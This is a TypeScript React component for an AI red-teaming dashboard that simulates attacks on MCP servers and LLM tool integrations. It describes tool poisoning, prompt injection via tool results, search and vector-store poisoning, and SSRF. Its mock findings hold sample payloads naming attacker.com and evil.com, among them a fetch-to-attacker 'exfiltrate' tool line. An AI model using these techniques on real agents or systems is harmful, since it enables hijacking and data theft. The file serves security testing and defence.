/**
 * File: AdversarialLab.tsx
 * Purpose: Main Atemi Lab dashboard - MCP + Tools attack configuration & monitoring
 * Story: S73, TPI-NODA-6.1, P3.2, H13.2, H13.3 - Atemi Lab Dashboard + Tabbed UI + Model Selector
 * Index:
 * - AtemiTab type (line ~18)
 * - AttackMode type (line ~50)
 * - AttackToolDef interface (line ~52)
 * - LEARN_MORE_DATA (line ~66)
 * - MODE_CONFIG (line ~154)
 * - ATTACK_TOOLS (line ~195)
 * - isToolEnabledAtMode helper (line ~344)
 * - AdversarialLabProps interface (line ~354)
 * - AdversarialLab component (line ~377)
 */

'use client'

import { useState, useMemo, useCallback, useRef } from 'react'
import { cn } from '@/lib/utils'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { Badge } from '@/components/ui/badge'
import {
  Shield,
  Swords,
  Zap,
  Flame,
  Activity,
  Wrench,
  LayoutGrid,
  Settings,
  Globe,
  Target,
  AlertTriangle,
  CheckCircle2,
  Lock,
  X,
} from 'lucide-react'
import { Button } from '@/components/ui/button'
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/tabs'
import { ModuleHeader } from '@/components/ui/ModuleHeader'
import { AttackToolCard } from './AttackToolCard'
import type { LearnMoreContent } from './AttackToolCard'
import { AttackLog } from './AttackLog'
import { AtemiGettingStarted } from './AtemiGettingStarted'
import { McpConnectorStatus } from './McpConnectorStatus'
import { AtemiConfig } from './AtemiConfig'
import { SessionRecorder } from './SessionRecorder'
import { SessionHistory } from './SessionHistory'
import { SkillsLibrary } from './SkillsLibrary'
import { executeSkill } from '@/lib/adversarial-skill-engine'
import { useEcosystemEmit } from '@/lib/contexts/EcosystemContext'
import type { EcosystemSeverity } from '@/lib/ecosystem-types'

// ---------------------------------------------------------------------------
// Types & Configuration
// ---------------------------------------------------------------------------

type AtemiTab = 'attack-tools' | 'skills' | 'mcp' | 'protocol-fuzz' | 'webmcp'

type AttackMode = 'passive' | 'basic' | 'advanced' | 'aggressive'

interface AttackToolDef {
  id: string
  name: string
  type: 'mcp' | 'tool'
  description: string
  severity: 'low' | 'medium' | 'high' | 'critical'
  /** Minimum mode required for this tool to be enabled */
  minMode: AttackMode
}

// ---------------------------------------------------------------------------
// Learn More Content per attack tool (Story 6.1)
// ---------------------------------------------------------------------------

const LEARN_MORE_DATA: Record<string, LearnMoreContent> = {
  'capability-spoofing': {
    technique: 'Forges MCP server capability declarations to claim unsupported permissions such as tool invocation, resource access, or sampling.',
    expectedBehavior: 'The client should reject unrecognized capabilities and validate server claims against its allowlist.',
    defensiveImplications: 'Implement strict capability validation on the client side. Never trust server-declared capabilities without verification.',
  },
  'tool-poisoning': {
    technique: 'Embeds malicious prompt injection payloads within MCP tool description fields and JSON schema annotations that get injected into the LLM context.',
    expectedBehavior: 'Tool descriptions should be sanitized before being included in LLM prompts. Schema fields should not contain executable instructions.',
    defensiveImplications: 'Sanitize all tool metadata before passing to LLMs. Use structured tool registries with pre-approved descriptions.',
  },
  'uri-traversal': {
    technique: 'Crafts MCP resource URIs with path traversal sequences (../, encoded variants) to access files and endpoints outside the allowed scope.',
    expectedBehavior: 'Resource handlers should normalize and validate URIs, rejecting any that escape the allowed directory.',
    defensiveImplications: 'Implement path canonicalization and allowlist-based URI validation in resource handlers.',
  },
  'sampling-loop': {
    technique: 'Exploits the MCP sampling capability to create recursive LLM invocation chains where each response triggers another sampling request.',
    expectedBehavior: 'The system should detect and break recursive patterns, enforcing maximum depth and rate limits on sampling.',
    defensiveImplications: 'Implement call depth limits, rate limiting, and cycle detection on MCP sampling requests.',
  },
  'name-typosquatting': {
    technique: 'Registers MCP tools with names visually similar to trusted tools (homoglyphs, extra characters) to intercept legitimate tool calls.',
    expectedBehavior: 'Tool resolution should use exact matching and warn on similar names. User confirmation for unfamiliar tools.',
    defensiveImplications: 'Use tool fingerprinting and maintain a trusted tool registry. Alert on suspicious name similarities.',
  },
  'cross-server-leak': {
    technique: 'Exploits shared namespaces between MCP servers to leak conversation context, tool results, or user data across trust boundaries.',
    expectedBehavior: 'Each MCP server should operate in an isolated context without access to other servers data.',
    defensiveImplications: 'Enforce strict namespace isolation between MCP servers. Never share context across trust boundaries.',
  },
  'notification-flood': {
    technique: 'Sends a burst of MCP notification messages (progress, log events) to overwhelm the client UI and processing pipeline.',
    expectedBehavior: 'Clients should implement rate limiting and throttling for incoming notifications.',
    defensiveImplications: 'Rate-limit notifications per server, implement backpressure, and use notification queues.',
  },
  'prompt-injection': {
    technique: 'Injects prompt override payloads via MCP tool results and resource content fields that get processed by the LLM as instructions.',
    expectedBehavior: 'Tool results should be treated as untrusted data and sandboxed from the instruction context.',
    defensiveImplications: 'Use instruction-data separation patterns. Mark tool outputs as data, not instructions, in the LLM context.',
  },
  'vector-db-poisoning': {
    technique: 'Manipulates vector database entries through namespace traversal and metadata injection to corrupt retrieval results.',
    expectedBehavior: 'Vector DB operations should validate namespace boundaries and sanitize metadata inputs.',
    defensiveImplications: 'Implement write access controls, metadata validation, and namespace isolation for vector databases.',
  },
  'browser-exploitation': {
    technique: 'Returns web page content containing embedded prompt injections within DOM elements that the LLM processes.',
    expectedBehavior: 'Browser tool output should be sanitized to remove potential prompt injections before LLM processing.',
    defensiveImplications: 'Sanitize and truncate browser content. Extract only relevant text, stripping suspicious patterns.',
  },
  'api-exploitation': {
    technique: 'Abuses API/fetch tools to perform SSRF attacks, access internal endpoints, and exfiltrate data to attacker-controlled servers.',
    expectedBehavior: 'API tools should restrict target URLs to an allowlist and block internal network ranges.',
    defensiveImplications: 'Implement URL allowlisting, block RFC 1918 ranges, and monitor for data exfiltration patterns.',
  },
  'filesystem-exploitation': {
    technique: 'Uses path traversal and symlink attacks to read or write files outside the intended directory through filesystem tools.',
    expectedBehavior: 'Filesystem operations should be sandboxed with chroot-like restrictions and symlink resolution.',
    defensiveImplications: 'Use realpath validation, restrict to allowed directories, and resolve symlinks before access checks.',
  },
  'model-exploitation': {
    technique: 'Systematically probes the model to extract training data, map decision boundaries, or perform model distillation.',
    expectedBehavior: 'The system should detect systematic probing patterns and enforce query rate limits.',
    defensiveImplications: 'Monitor for extraction patterns, implement output perturbation, and rate-limit repetitive queries.',
  },
  'email-exploitation': {
    technique: 'Generates phishing payloads and injects malicious headers through email sending tools.',
    expectedBehavior: 'Email tools should validate recipients, sanitize headers, and scan content for phishing indicators.',
    defensiveImplications: 'Implement header injection protection, content scanning, and recipient allowlisting.',
  },
  'code-repository-poisoning': {
    technique: 'Injects malicious code via commits, tampers with CI/CD configurations, and poisons dependency manifests through repository tools.',
    expectedBehavior: 'Repository tools should enforce code review workflows and block direct commits to protected branches.',
    defensiveImplications: 'Require code review for all changes, use signed commits, and validate CI/CD configurations.',
  },
  'message-queue-exploitation': {
    technique: 'Injects poisoned messages and hijacks consumer subscriptions through message queue integration tools.',
    expectedBehavior: 'Queue tools should validate message format and enforce topic-level access controls.',
    defensiveImplications: 'Implement message schema validation, topic ACLs, and consumer authentication.',
  },
  'search-poisoning': {
    technique: 'Uses SEO manipulation and snippet injection to embed prompt injection payloads in search results returned to the LLM.',
    expectedBehavior: 'Search results should be treated as untrusted and sanitized before inclusion in LLM context.',
    defensiveImplications: 'Sanitize search snippets, limit result length, and detect injection patterns in search output.',
  },
}

const MODE_CONFIG = {
  passive: {
    label: 'Passive',
    icon: Shield,
    description: 'Observation only - no active attacks. Monitors for anomalous MCP traffic patterns.',
    color: 'bg-[var(--severity-low)]',
    textColor: 'text-[var(--severity-low)]',
    borderColor: 'border-[var(--severity-low)]',
  },
  basic: {
    label: 'Basic',
    icon: Swords,
    description: 'Low-risk probes - capability checks, benign enumeration, notification tests.',
    color: 'bg-[var(--warning)]',
    textColor: 'text-[var(--warning)]',
    borderColor: 'border-[var(--warning)]',
  },
  advanced: {
    label: 'Advanced',
    icon: Zap,
    description: 'Active exploitation attempts - tool poisoning, URI traversal, cross-server leaks.',
    color: 'bg-[var(--severity-high)]',
    textColor: 'text-[var(--severity-high)]',
    borderColor: 'border-[var(--severity-high)]',
  },
  aggressive: {
    label: 'Aggressive',
    icon: Flame,
    description: 'Full adversarial suite - all attack vectors including prompt injection chains and sampling loops.',
    color: 'bg-[var(--danger)]',
    textColor: 'text-[var(--danger)]',
    borderColor: 'border-[var(--danger)]',
  },
} as const

const MODE_ORDER: AttackMode[] = ['passive', 'basic', 'advanced', 'aggressive']

// ---------------------------------------------------------------------------
// Attack Tool Definitions (8 MCP P4 + 9 P5 Tools)
// ---------------------------------------------------------------------------

const ATTACK_TOOLS: AttackToolDef[] = [
  // P4: MCP protocol-level attacks
  {
    id: 'capability-spoofing',
    name: 'Capability Spoofing',
    type: 'mcp',
    description: 'Forge MCP server capabilities to claim unauthorized tool permissions and resource access.',
    severity: 'high',
    minMode: 'basic',
  },
  {
    id: 'tool-poisoning',
    name: 'Tool Poisoning',
    type: 'mcp',
    description: 'Inject malicious instructions via MCP tool description and schema fields.',
    severity: 'critical',
    minMode: 'advanced',
  },
  {
    id: 'uri-traversal',
    name: 'URI Traversal',
    type: 'mcp',
    description: 'Traverse MCP resource URIs to access files and endpoints outside allowed scope.',
    severity: 'high',
    minMode: 'advanced',
  },
  {
    id: 'sampling-loop',
    name: 'Sampling Loop',
    type: 'mcp',
    description: 'Exploit MCP sampling to create recursive LLM invocation loops that drain compute.',
    severity: 'critical',
    minMode: 'aggressive',
  },
  {
    id: 'name-typosquatting',
    name: 'Name Typosquatting',
    type: 'mcp',
    description: 'Register MCP tools with names similar to trusted tools to intercept invocations.',
    severity: 'medium',
    minMode: 'basic',
  },
  {
    id: 'cross-server-leak',
    name: 'Cross-Server Leak',
    type: 'mcp',
    description: 'Leak conversation context between MCP servers via shared tool namespaces.',
    severity: 'high',
    minMode: 'advanced',
  },
  {
    id: 'notification-flood',
    name: 'Notification Flood',
    type: 'mcp',
    description: 'Flood MCP notification channel with progress/log events to overwhelm the client.',
    severity: 'low',
    minMode: 'passive',
  },
  {
    id: 'prompt-injection',
    name: 'Prompt Injection',
    type: 'mcp',
    description: 'Inject prompt override payloads via MCP tool results and resource content fields.',
    severity: 'critical',
    minMode: 'aggressive',
  },
  // P5: Tool integration-level attacks
  {
    id: 'vector-db-poisoning',
    name: 'Vector DB Poisoning',
    type: 'tool',
    description: 'Poison vector database embeddings via namespace traversal and metadata injection.',
    severity: 'high',
    minMode: 'advanced',
  },
  {
    id: 'browser-exploitation',
    name: 'Browser Exploitation',
    type: 'tool',
    description: 'Return DOM content with embedded prompt injections via browser automation tools.',
    severity: 'medium',
    minMode: 'basic',
  },
  {
    id: 'api-exploitation',
    name: 'API Exploitation',
    type: 'tool',
    description: 'Abuse API/fetch tools for SSRF, internal endpoint access, and data exfiltration.',
    severity: 'high',
    minMode: 'advanced',
  },
  {
    id: 'filesystem-exploitation',
    name: 'Filesystem Exploitation',
    type: 'tool',
    description: 'Path traversal and symlink attacks via filesystem read/write tools.',
    severity: 'high',
    minMode: 'advanced',
  },
  {
    id: 'model-exploitation',
    name: 'Model Exploitation',
    type: 'tool',
    description: 'Model extraction, distillation probes, and decision boundary mapping attacks.',
    severity: 'medium',
    minMode: 'basic',
  },
  {
    id: 'email-exploitation',
    name: 'Email Exploitation',
    type: 'tool',
    description: 'Phishing payload generation and header injection via email sending tools.',
    severity: 'medium',
    minMode: 'basic',
  },
  {
    id: 'code-repository-poisoning',
    name: 'Code Repo Poisoning',
    type: 'tool',
    description: 'Inject malicious commits, tamper with CI configs, and poison dependency manifests.',
    severity: 'critical',
    minMode: 'aggressive',
  },
  {
    id: 'message-queue-exploitation',
    name: 'Message Queue Exploitation',
    type: 'tool',
    description: 'Inject poisoned messages and hijack consumer subscriptions via queue tools.',
    severity: 'high',
    minMode: 'advanced',
  },
  {
    id: 'search-poisoning',
    name: 'Search Poisoning',
    type: 'tool',
    description: 'SEO poisoning and snippet injection to embed prompt payloads in search results.',
    severity: 'medium',
    minMode: 'basic',
  },
]

// ---------------------------------------------------------------------------
// Available Models (H13.3 - mock data)
// ---------------------------------------------------------------------------

const AVAILABLE_MODELS = [
  { id: 'gpt-4o', name: 'GPT-4o', provider: 'openai' },
  { id: 'gpt-4o-mini', name: 'GPT-4o Mini', provider: 'openai' },
  { id: 'claude-sonnet-4-20250514', name: 'Claude Sonnet 4', provider: 'anthropic' },
  { id: 'claude-haiku-4-5-20251001', name: 'Claude Haiku 4.5', provider: 'anthropic' },
  { id: 'llama-3.1-8b', name: 'Llama 3.1 8B', provider: 'ollama' },
  { id: 'gemini-2.0-flash', name: 'Gemini 2.0 Flash', provider: 'google' },
] as const

const SESSION_STORAGE_KEY = 'atemi-target-model'

// ---------------------------------------------------------------------------
// WebMCP Testing Configuration (H16.3)
// ---------------------------------------------------------------------------

type WebMcpTransport = 'http' | 'sse' | 'websocket'

const WEBMCP_CATEGORIES = [
  { id: 'web-poison', label: 'Web Poisoning', count: 10 },
  { id: 'browser-tool', label: 'Browser Tool Injection', count: 10 },
  { id: 'oauth', label: 'OAuth Hijacking', count: 8 },
  { id: 'cors', label: 'CORS Exploitation', count: 6 },
  { id: 'content-type', label: 'Content-Type Confusion', count: 5 },
  { id: 'chunked', label: 'Chunked Encoding', count: 5 },
  { id: 'ws-hijack', label: 'WebSocket Hijacking', count: 5 },
] as const

type WebMcpCategoryId = typeof WEBMCP_CATEGORIES[number]['id']

interface WebMcpFinding {
  id: string
  category: string
  severity: 'low' | 'medium' | 'high' | 'critical'
  title: string
  description: string
  evidence: string
}

/** SSRF validation — blocks RFC1918, localhost, link-local, cloud metadata IPs */
function isUrlSafe(url: string): { safe: boolean; reason?: string } {
  try {
    const parsed = new URL(url)
    if (!['http:', 'https:'].includes(parsed.protocol)) {
      return { safe: false, reason: 'Only HTTP/HTTPS protocols allowed' }
    }
    const host = parsed.hostname.toLowerCase()
    if (host === 'localhost' || host === '127.0.0.1' || host === '::1') {
      return { safe: false, reason: 'Localhost addresses blocked' }
    }
    // RFC1918 Class A: 10.0.0.0/8
    if (/^10\./.test(host)) {
      return { safe: false, reason: 'Private IP (10.x) blocked' }
    }
    // RFC1918 Class B: 172.16.0.0/12
    if (/^172\.(1[6-9]|2\d|3[01])\./.test(host)) {
      return { safe: false, reason: 'Private IP (172.16-31.x) blocked' }
    }
    // RFC1918 Class C: 192.168.0.0/16
    if (/^192\.168\./.test(host)) {
      return { safe: false, reason: 'Private IP (192.168.x) blocked' }
    }
    // Cloud metadata endpoints
    if (host === '169.254.169.254' || host.endsWith('.internal')) {
      return { safe: false, reason: 'Cloud metadata endpoint blocked' }
    }
    // Link-local
    if (/^169\.254\./.test(host)) {
      return { safe: false, reason: 'Link-local address blocked' }
    }
    return { safe: true }
  } catch {
    return { safe: false, reason: 'Invalid URL format' }
  }
}

/** Generate mock WebMCP findings for selected categories */
function generateMockFindings(categories: WebMcpCategoryId[], transport: WebMcpTransport): WebMcpFinding[] {
  const findings: WebMcpFinding[] = []
  const severities: Array<'low' | 'medium' | 'high' | 'critical'> = ['low', 'medium', 'high', 'critical']
  const mockData: Record<string, Array<{ title: string; desc: string; evidence: string; sev: number }>> = {
    'web-poison': [
      { title: 'Cache poisoning via Host header', desc: 'MCP endpoint accepts arbitrary Host headers allowing cache key manipulation.', evidence: 'Host: attacker.com\\r\\nX-Forwarded-Host: attacker.com', sev: 2 },
      { title: 'Response splitting in tool output', desc: 'Tool response content allows CRLF injection enabling HTTP response splitting.', evidence: 'Content-Type: text/html\\r\\n\\r\\n<script>/*injected*/</script>', sev: 3 },
    ],
    'browser-tool': [
      { title: 'DOM-based tool injection', desc: 'Browser automation tool processes unsanitized DOM content containing MCP tool definitions.', evidence: '<div data-mcp-tool="exfiltrate" data-action="fetch(attacker.com)">', sev: 3 },
      { title: 'Service worker interception', desc: 'Malicious service worker intercepts MCP HTTP transport messages.', evidence: 'navigator.serviceWorker.register("/sw-intercept.js")', sev: 2 },
    ],
    'oauth': [
      { title: 'Authorization code interception', desc: 'MCP OAuth flow vulnerable to authorization code interception via open redirect.', evidence: 'redirect_uri=https://mcp.example.com/callback/../../../attacker.com', sev: 3 },
      { title: 'Token scope escalation', desc: 'Requested OAuth scopes exceed declared MCP server capabilities.', evidence: 'scope=mcp:tools:* mcp:resources:* mcp:sampling:*', sev: 2 },
    ],
    'cors': [
      { title: 'Wildcard CORS with credentials', desc: 'MCP endpoint returns Access-Control-Allow-Origin: * with credentials flag.', evidence: 'Access-Control-Allow-Origin: *\\nAccess-Control-Allow-Credentials: true', sev: 2 },
      { title: 'Origin reflection without validation', desc: 'Server reflects Origin header without allowlist validation.', evidence: 'Origin: https://evil.com -> Access-Control-Allow-Origin: https://evil.com', sev: 1 },
    ],
    'content-type': [
      { title: 'MIME type confusion', desc: 'MCP server accepts text/html when application/json expected, enabling polyglot payloads.', evidence: 'Content-Type: text/html\\n\\n{"jsonrpc":"2.0","method":"tools/call"}', sev: 1 },
    ],
    'chunked': [
      { title: 'Request smuggling via chunked encoding', desc: 'MCP HTTP transport vulnerable to request smuggling via conflicting Content-Length and Transfer-Encoding.', evidence: 'Transfer-Encoding: chunked\\nContent-Length: 42', sev: 3 },
    ],
    'ws-hijack': [
      { title: 'WebSocket upgrade hijacking', desc: 'MCP WebSocket endpoint does not validate Origin during upgrade handshake.', evidence: 'Origin: https://attacker.com\\nUpgrade: websocket\\nConnection: Upgrade', sev: 2 },
    ],
  }

  for (const catId of categories) {
    const catFindings = mockData[catId]
    if (!catFindings) continue
    for (const f of catFindings) {
      findings.push({
        id: `${catId}-${findings.length}`,
        category: WEBMCP_CATEGORIES.find(c => c.id === catId)?.label ?? catId,
        severity: severities[f.sev],
        title: `[${transport.toUpperCase()}] ${f.title}`,
        description: f.desc,
        evidence: f.evidence,
      })
    }
  }
  return findings
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/**
 * Determine which tools are enabled at a given attack mode.
 * A tool is enabled when its minMode index <= the selected mode index.
 */
function isToolEnabledAtMode(tool: AttackToolDef, mode: AttackMode): boolean {
  const modeIdx = MODE_ORDER.indexOf(mode)
  const toolMinIdx = MODE_ORDER.indexOf(tool.minMode)
  return toolMinIdx <= modeIdx
}

// ---------------------------------------------------------------------------
// Component
// ---------------------------------------------------------------------------

export interface AdversarialLabProps {
  /** Initial attack mode */
  initialMode?: AttackMode
  /** Simulated connection status (actual API in P8) */
  connected?: boolean
  /** Optional additional CSS classes */
  className?: string
}

/**
 * AdversarialLab
 *
 * Main dashboard for the Atemi Lab - MCP + Tools attack simulation.
 * This is a UI dashboard only - it does NOT run the actual MCP server.
 * Shows status, configuration, and results via API calls.
 *
 * Features:
 * - Mode selector (Passive/Basic/Advanced/Aggressive)
 * - Active tools count and scenario count
 * - Connection status indicator
 * - Grid of 17 AttackToolCards (8 MCP + 9 Tool)
 * - Attack event log viewer
 */
export function AdversarialLab({
  initialMode = 'passive',
  connected = false,
  className,
}: AdversarialLabProps) {
  const [mode, setMode] = useState<AttackMode>(initialMode)
  const [activeTab, setActiveTab] = useState<AtemiTab>('attack-tools')
  const [configOpen, setConfigOpen] = useState(false)
  const [executingSkill, setExecutingSkill] = useState<string | null>(null)
  const [skillError, setSkillError] = useState<string | null>(null)
  const executingRef = useRef(false)
  const { emitFinding } = useEcosystemEmit('atemi')

  // WebMCP Testing state (H16.3)
  const [wmcpTargetUrl, setWmcpTargetUrl] = useState('')
  const [wmcpTransport, setWmcpTransport] = useState<WebMcpTransport>('http')
  const [wmcpCategories, setWmcpCategories] = useState<Set<WebMcpCategoryId>>(new Set())
  const [wmcpIsExecuting, setWmcpIsExecuting] = useState(false)
  const [wmcpShowConsent, setWmcpShowConsent] = useState(false)
  const [wmcpResults, setWmcpResults] = useState<WebMcpFinding[]>([])
  const [wmcpUrlError, setWmcpUrlError] = useState<string | null>(null)

  // H13.3: Target model selection with sessionStorage persistence
  const [targetModel, setTargetModel] = useState<string>(() => {
    if (typeof window === 'undefined') return AVAILABLE_MODELS[0].id
    try {
      const stored = sessionStorage.getItem(SESSION_STORAGE_KEY)
      if (stored && AVAILABLE_MODELS.some((m) => m.id === stored)) return stored
    } catch {
      // sessionStorage may be unavailable
    }
    return AVAILABLE_MODELS[0].id
  })

  const handleModelChange = useCallback((e: React.ChangeEvent<HTMLSelectElement>) => {
    const value = e.target.value
    setTargetModel(value)
    try {
      sessionStorage.setItem(SESSION_STORAGE_KEY, value)
    } catch {
      // sessionStorage may throw QuotaExceededError
    }
  }, [])

  /** Map skill severity to ecosystem severity */
  const toEcoSeverity = useCallback((sev: string): EcosystemSeverity => {
    if (sev === 'critical') return 'CRITICAL'
    if (sev === 'high') return 'WARNING'
    return 'INFO'
  }, [])

  /** Execute a skill and emit the result to the ecosystem */
  const handleExecuteSkill = useCallback(async (skillId: string) => {
    if (executingRef.current) return // prevent concurrent executions (ref = stable)
    executingRef.current = true
    setExecutingSkill(skillId)
    setSkillError(null)
    try {
      const result = await executeSkill(skillId)
      // Emit finding to ecosystem
      await emitFinding({
        findingType: 'attack_variant',
        severity: toEcoSeverity(result.severity),
        title: `Skill Execution: ${skillId}`,
        description: result.summary,
        owaspMapping: undefined,
        evidence: result.rawContent.slice(0, 500),
        metadata: {
          skillId: result.skillId,
          success: result.success,
          durationMs: result.durationMs,
          stepsTotal: result.stepResults.length,
          stepsPassed: result.stepResults.filter(s => s.status === 'passed').length,
        },
      })
    } catch (err) {
      setSkillError(err instanceof Error ? err.message : 'Skill execution failed')
    } finally {
      executingRef.current = false
      setExecutingSkill(null)
    }
  }, [emitFinding, toEcoSeverity])

  const activeTools = useMemo(
    () => ATTACK_TOOLS.filter((t) => isToolEnabledAtMode(t, mode)),
    [mode],
  )

  const mcpCount = activeTools.filter((t) => t.type === 'mcp').length
  const toolCount = activeTools.filter((t) => t.type === 'tool').length

  const currentModeCfg = MODE_CONFIG[mode]

  const handleOpenConfig = useCallback(() => setConfigOpen(true), [])
  const handleCloseConfig = useCallback(() => setConfigOpen(false), [])

  // WebMCP handlers (H16.3)
  const handleWmcpToggleCategory = useCallback((catId: WebMcpCategoryId) => {
    setWmcpCategories(prev => {
      const next = new Set(prev)
      if (next.has(catId)) {
        next.delete(catId)
      } else {
        next.add(catId)
      }
      return next
    })
  }, [])

  const handleWmcpUrlChange = useCallback((url: string) => {
    setWmcpTargetUrl(url)
    if (url.trim()) {
      const validation = isUrlSafe(url)
      setWmcpUrlError(validation.safe ? null : (validation.reason ?? 'Invalid URL'))
    } else {
      setWmcpUrlError(null)
    }
  }, [])

  const handleWmcpRequestExecute = useCallback(() => {
    if (!wmcpTargetUrl.trim() || wmcpUrlError || wmcpCategories.size === 0) return
    setWmcpShowConsent(true)
  }, [wmcpTargetUrl, wmcpUrlError, wmcpCategories.size])

  const handleWmcpConfirmExecute = useCallback(() => {
    setWmcpShowConsent(false)
    setWmcpIsExecuting(true)
    setWmcpResults([])
    // Simulate execution delay then show mock results
    const timer = setTimeout(() => {
      const findings = generateMockFindings(
        Array.from(wmcpCategories),
        wmcpTransport,
      )
      setWmcpResults(findings)
      setWmcpIsExecuting(false)
    }, 1500)
    return () => clearTimeout(timer)
  }, [wmcpCategories, wmcpTransport])

  const handleWmcpCancelConsent = useCallback(() => {
    setWmcpShowConsent(false)
  }, [])

  return (
    <div className={cn('space-y-6', className)}>
      {/* Header */}
      <ModuleHeader
        title="Atemi Lab"
        subtitle="MCP protocol and tool integration attack simulation dashboard"
        icon={Swords}
        actions={
          <>
            <SessionRecorder mode={mode} />
            <Button
              variant="outline"
              size="sm"
              onClick={handleOpenConfig}
              aria-label="Open Atemi Lab configuration"
            >
              <Settings className="h-4 w-4" aria-hidden="true" />
              Config
            </Button>
          </>
        }
      />

      {/* Getting Started Guide (Story 6.1) */}
      <AtemiGettingStarted />

      {/* MCP Connection Status (Story 6.1) */}
      <McpConnectorStatus connected={connected} modelName={AVAILABLE_MODELS.find(m => m.id === targetModel)?.name ?? targetModel} />

      {/* Config Panel (Story 6.1) */}
      <AtemiConfig isOpen={configOpen} onClose={handleCloseConfig} />

      {/* Mode Selector */}
      <Card>
        <CardHeader className="pb-3">
          <CardTitle className="text-base flex items-center gap-2">
            <Activity className="h-4 w-4 text-muted-foreground" aria-hidden="true" />
            Attack Mode
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-3">
          <div
            className="grid grid-cols-2 lg:grid-cols-4 gap-3"
            role="radiogroup"
            aria-label="Select attack mode"
          >
            {MODE_ORDER.map((m) => {
              const cfg = MODE_CONFIG[m]
              const ModeIcon = cfg.icon
              const isSelected = m === mode

              return (
                <button
                  key={m}
                  onClick={() => setMode(m)}
                  role="radio"
                  aria-checked={isSelected}
                  aria-label={`${cfg.label} mode: ${cfg.description}`}
                  className={cn(
                    'flex items-center gap-2 px-3 py-2.5 rounded-lg border text-sm font-medium',
                    'motion-safe:transition-all motion-safe:duration-[var(--transition-normal)]',
                    'focus:outline-none focus-visible:ring-2 focus-visible:ring-[var(--ring)] focus-visible:ring-offset-1 focus-visible:ring-offset-[var(--background)]',
                    isSelected
                      ? cn('border-2', cfg.borderColor, 'bg-[var(--bg-tertiary)]', cfg.textColor)
                      : 'border-[var(--border)] text-muted-foreground hover:bg-[var(--bg-quaternary)] hover:text-[var(--foreground)]',
                  )}
                >
                  <ModeIcon className="h-4 w-4 flex-shrink-0" aria-hidden="true" />
                  <span>{cfg.label}</span>
                </button>
              )
            })}
          </div>

          {/* Mode description */}
          <p className={cn('text-xs leading-relaxed', currentModeCfg.textColor)}>
            {currentModeCfg.description}
          </p>
        </CardContent>
      </Card>

      {/* Stats Row */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
        <Card>
          <CardContent className="p-4">
            <p className="text-xs text-muted-foreground mb-1">Active Tools</p>
            <p className="text-xl font-bold text-[var(--foreground)]">{activeTools.length}</p>
            <p className="text-xs text-[var(--text-tertiary)]">of {ATTACK_TOOLS.length} total</p>
          </CardContent>
        </Card>
        <Card>
          <CardContent className="p-4">
            <p className="text-xs text-muted-foreground mb-1">MCP Attacks</p>
            <p className="text-xl font-bold text-[var(--dojo-primary)]">{mcpCount}</p>
            <p className="text-xs text-[var(--text-tertiary)]">protocol-level</p>
          </CardContent>
        </Card>
        <Card>
          <CardContent className="p-4">
            <p className="text-xs text-muted-foreground mb-1">Tool Attacks</p>
            <p className="text-xl font-bold text-[var(--severity-low)]">{toolCount}</p>
            <p className="text-xs text-[var(--text-tertiary)]">integration-level</p>
          </CardContent>
        </Card>
        <Card>
          <CardContent className="p-4">
            <p className="text-xs text-muted-foreground mb-1">Scenarios</p>
            <p className="text-xl font-bold text-[var(--foreground)]">{activeTools.length * 3}</p>
            <p className="text-xs text-[var(--text-tertiary)]">test permutations</p>
          </CardContent>
        </Card>
      </div>

      {/* Target Model Selector (H13.3) */}
      <Card>
        <CardContent className="p-4 flex items-center gap-3">
          <Target className="h-5 w-5 text-[var(--dojo-primary)] flex-shrink-0" aria-hidden="true" />
          <label
            htmlFor="atemi-target-model-select"
            className="text-sm font-medium text-[var(--foreground)] whitespace-nowrap"
          >
            Target Model
          </label>
          <select
            id="atemi-target-model-select"
            value={targetModel}
            onChange={handleModelChange}
            aria-label="Select target model for attack execution"
            className={cn(
              'flex-1 min-h-[44px] rounded-md border border-[var(--border)] bg-[var(--bg-secondary)]',
              'px-3 py-2 text-sm text-[var(--foreground)]',
              'focus:outline-none focus-visible:ring-2 focus-visible:ring-[var(--ring)] focus-visible:ring-offset-1 focus-visible:ring-offset-[var(--background)]',
            )}
          >
            {AVAILABLE_MODELS.map((model) => (
              <option key={model.id} value={model.id}>
                {model.name} ({model.provider})
              </option>
            ))}
          </select>
        </CardContent>
      </Card>

      {/* Skill execution error banner */}
      {skillError && (
        <Card className="border-[var(--severity-high)]">
          <CardContent className="p-3 flex items-center justify-between">
            <p className="text-sm text-[var(--severity-high)]">
              Skill execution error: {skillError}
            </p>
            <Button
              type="button"
              variant="ghost"
              size="sm"
              onClick={() => setSkillError(null)}
              className="h-7 text-xs"
            >
              Dismiss
            </Button>
          </CardContent>
        </Card>
      )}

      {/* Tabbed Interface (H13.2) */}
      <Tabs
        value={activeTab}
        onValueChange={(v) => {
          const valid: AtemiTab[] = ['attack-tools', 'skills', 'mcp', 'protocol-fuzz', 'webmcp']
          if (valid.includes(v as AtemiTab)) setActiveTab(v as AtemiTab)
        }}
      >
        <TabsList className="grid grid-cols-5 w-full h-auto gap-1 bg-muted/50 p-1 rounded-lg" aria-label="Atemi Lab sections">
          <TabsTrigger value="attack-tools" className="gap-1 text-xs min-h-[36px] rounded-md">
            <Swords className="h-3 w-3" aria-hidden="true" />
            <span className="hidden sm:inline">Attack Tools</span>
            <span className="sm:hidden">Tools</span>
          </TabsTrigger>
          <TabsTrigger value="skills" className="gap-1 text-xs min-h-[36px] rounded-md">
            <Wrench className="h-3 w-3" aria-hidden="true" />
            <span>Skills</span>
          </TabsTrigger>
          <TabsTrigger value="mcp" className="gap-1 text-xs min-h-[36px] rounded-md">
            <Shield className="h-3 w-3" aria-hidden="true" />
            <span>MCP</span>
          </TabsTrigger>
          <TabsTrigger value="protocol-fuzz" className="gap-1 text-xs min-h-[36px] rounded-md">
            <Zap className="h-3 w-3" aria-hidden="true" />
            <span className="hidden sm:inline">Protocol Fuzz</span>
            <span className="sm:hidden">Fuzz</span>
          </TabsTrigger>
          <TabsTrigger value="webmcp" className="gap-1 text-xs min-h-[36px] rounded-md">
            <Globe className="h-3 w-3" aria-hidden="true" />
            <span>WebMCP</span>
          </TabsTrigger>
        </TabsList>

        {/* Attack Tools Tab — tool-type attack cards */}
        <TabsContent value="attack-tools" className="mt-4">
          {mode === 'passive' && (
